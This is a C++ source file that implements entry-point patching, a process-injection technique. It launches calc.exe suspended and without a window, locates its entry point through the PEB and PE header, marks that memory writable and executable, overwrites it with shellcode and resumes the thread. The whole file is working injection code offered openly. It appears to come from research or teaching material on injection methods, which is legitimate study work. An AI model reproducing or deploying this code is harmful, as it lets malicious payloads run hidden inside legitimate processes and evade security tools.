/**
 * @file CreatePatched.cpp
 * @author Giulio De Pasquale, hasherezade
 * @brief Entrypoint Patching
 */

#include "CreatePatched.h"
#include "utils.h"
#define PATH_LENGTH 260
#define BUF_LENGTH 0x1000

 /**
  * @brief This function populate the necessary library function pointers.
  *
  * In order to use WINAPI's functions, we require to do some run-time dynamic
  * linking. This helper function retrieves the handle of **ntdll.dll**. Once
  * opened, several function pointers will be initialized
  * with their corresponding WINAPI's counterpart.
  * @see
  * https://msdn.microsoft.com/it-it/library/windows/desktop/ms683199(v=vs.85).aspx
  * @see
  * https://en.wikipedia.org/wiki/Dynamic-link_library#Explicit_run-time_linking
  */
BOOL LoadNtdllFunctions() {
	HMODULE hNtdll = NULL;
	hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll) {
		ZwQueryInformationProcess =
			(long(__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
			GetProcAddress(hNtdll, "ZwQueryInformationProcess");
	}
	else {
		DBG_ERROR(("Can't get handle of ntdll!"));
		return FALSE;
	}

	if (ZwQueryInformationProcess == NULL) {
		DBG_ERROR(("Can't get ZwQueryInformationProcess!"));
		return FALSE;
	}
	return TRUE;
}

int main() {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	wchar_t app_path[PATH_LENGTH];
	LPCVOID BaseAddress = 0;
	unsigned char header_buf[BUF_LENGTH];
	IMAGE_OPTIONAL_HEADER32 opt_hdr;
	DWORD ep_rva, oldProtect, read_bytes;

	/*
	* Initialize WINAPI function pointers
	*/
	if (LoadNtdllFunctions() == FALSE) {
		DBG_ERROR(("Failed to load NTDLL functions\n"));
		return -1;
	}

	// Zeroing si, pi and pbi
	memset(&si, 0, sizeof(STARTUPINFO));
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	// Generating full path to calc.exe
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe",
		(LPWSTR)app_path, sizeof(app_path));
	WDBG_INFO((L"Bening process' full path = %s\n", app_path));

	DBG_INFO(("Creating suspended process..\n"));
	if (!CreateProcessW((LPWSTR)app_path, // lpApplicationName
		NULL,             // lpCommandLine
		NULL,             // lpProcessAttributes
		NULL,             // lpThreadAttributes
		NULL,             // bInheritHandles
		CREATE_SUSPENDED | DETACHED_PROCESS |
		CREATE_NO_WINDOW, // dwCreationFlags
		NULL,                 // lpEnvironment
		NULL,                 // lpCurrentDirectory
		&si,                  // lpStartupInfo
		&pi                   // lpProcessInformation
	)) {
		DBG_ERROR(("CreateProcess failed with error 0x%x\n", GetLastError()));
		return -1;
	}

	DBG_INFO(("Querying process information..\n"));
	if (ZwQueryInformationProcess(pi.hProcess, 0, &pbi,
		sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0) {
		DBG_ERROR(("ZwQueryInformation failed with error 0x%x\n", GetLastError()));
		return -1;
	}
	DBG_SUCC(("PID = %d\n", pbi.UniqueProcessId));

	DBG_INFO(("Attempting to read base address..\n"));
	if (!ReadProcessMemory(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 8,
		&BaseAddress, sizeof(BaseAddress), &read_bytes) &&
		read_bytes != sizeof(BaseAddress)) {
		DBG_ERROR(("ReadProcessMemory failed with error 0x%x\n", GetLastError()));
		return -1;
	}
	DBG_SUCC(("Base address: 0x%p\n", BaseAddress));

	DBG_INFO(("Reading PE Header...\n"));
	if (!ReadProcessMemory(pi.hProcess, BaseAddress, header_buf,
		sizeof(header_buf), &read_bytes) &&
		read_bytes != sizeof(header_buf)) {
		DBG_ERROR(("ReadProcessMemory failed with error 0x%x\n", GetLastError()));
		return -1;
	}
	DBG_SUCC(("Image headers read.\n"));

	/*
	  Checking whether the header just read is correct.
	  Why checking for MZ?
	  More info @ https://en.wikipedia.org/wiki/DOS_MZ_executable
	*/
	if (header_buf[0] != 'M' || header_buf[1] != 'Z') {
		DBG_ERROR(("MZ header check failed\n"));
		return -1;
	}

	DBG_INFO(("Fetching Entry Point from Header...\n"));
	opt_hdr = GetOptHdr(header_buf);
	ep_rva = opt_hdr.AddressOfEntryPoint;
	DBG_SUCC(("Address of entry point = 0x%x\n", ep_rva));

	DBG_INFO(("Making entry point's page memory writable..\n"));
	if (!VirtualProtectEx(pi.hProcess, (BYTE *)BaseAddress + ep_rva,
		sizeof(shellcode), PAGE_EXECUTE_READWRITE,
		&oldProtect)) {
		DBG_ERROR(("VirtualProtectEx failed with error 0x%x\n", GetLastError()));
		return -1;
	}

	DBG_INFO(("Writing shellcode at entrypoint's address..\n"));
	if (!WriteProcessMemory(pi.hProcess, (BYTE *)BaseAddress + ep_rva,
		shellcode, sizeof(shellcode), &read_bytes) &&
		read_bytes != sizeof(shellcode)) {
		DBG_ERROR(("WriteProcessMemory failed with error 0x%x\n", GetLastError()));
		return -1;
	}

	DBG_SUCC(("Resuming thread in order to execute the shellcode...\n"));
	ResumeThread(pi.hThread);

	return 0;
}
